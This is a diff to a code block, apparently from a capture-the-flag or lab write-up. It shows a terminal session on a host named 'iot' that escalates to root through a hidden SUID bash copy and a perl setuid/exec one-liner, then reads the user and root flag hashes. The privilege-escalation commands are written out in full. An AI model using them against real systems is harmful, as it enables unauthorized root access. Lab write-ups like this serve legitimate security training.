@@ -148,10 +148,15 @@ redteam@iot:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
 redteam@iot:~$ /var/tmp/.suid_bash -p
 .suid_bash-5.2# id
 uid=1001(redteam) gid=1001(redteam) euid=0(root) groupes=1001(redteam),100(users)
-.suid_bash-5.2# cat /home/redteam/user.txt /root/root.txt
-4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1
+.suid_bash-5.2# which perl  
+/usr/bin/perl  
+.suid_bash-5.2# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(0); exec "/bin/bash";'  
+root@iot:~# su -  
+root@iot:~# id;whoami;hostname  
+uid=0(root) gid=0(root) groupes=0(root)  
+root  
+iot  
+root@iot:~# cat /home/redteam/user.txt /root/root.txt    
+4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1  
 cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8
-.suid_bash-5.2# whoami;hostname
-root
-iot
 ```
